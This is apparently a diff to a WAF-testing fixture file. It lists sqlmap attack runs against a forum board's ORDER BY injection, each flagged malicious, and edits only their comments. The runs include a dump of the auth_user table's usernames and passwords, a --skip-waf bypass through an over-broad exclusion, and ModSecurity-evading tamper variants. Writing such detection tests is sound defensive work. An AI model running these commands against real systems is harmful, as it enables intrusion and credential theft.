@@ -73,7 +73,7 @@
          "-D", "board", "-T", "auth_user", "-C", "username,password",
          "--dump", "--batch", "--answers=crack=N", "--flush-session"]
 
-# Lesson 5's first sqlmap run as the learner types it: the injection test
+# The first sqlmap run as a learner types it: the injection test
 # alone, sqlmap's own User-Agent, no dump. CRS 913100 names the scanner.
 - name: board-sqli-orderby-sqlmap-probe
   malicious: true
@@ -99,7 +99,7 @@
   args: ["-u", "{target}/?sort=posts_post.id*", "--dbms=mysql", "--technique=BT",
          "--level=5", "--risk=3", "--batch", "--flush-session", "--random-agent"]
 
-# Lesson 6's dump through an over-broad exclusion: a browser User-Agent, and
+# The dump through an over-broad exclusion: a browser User-Agent, and
 # --skip-waf so sqlmap sends no WAF-detection probe of its own, which would
 # trip the XSS and traversal signatures that still cover other parameters.
 - name: board-sqli-orderby-sqlmap-skip-waf
@@ -139,8 +139,8 @@
 
 # The same injection through sqlmap's tamper scripts written against
 # ModSecurity: keywords wrapped in MySQL versioned comments (/*!30874AND*/) and
-# spaces turned into comments. Held at paranoia level 1 (2026-10-13); no
-# lesson fires it, so it is the unseen variant of the unknown attack.
+# spaces turned into comments. Held at paranoia level 1 (2026-10-13); it is
+# the unseen variant of the unknown attack.
 - name: board-sqli-orderby-sqlmap-versioned
   malicious: true
   stage: initial-compromise
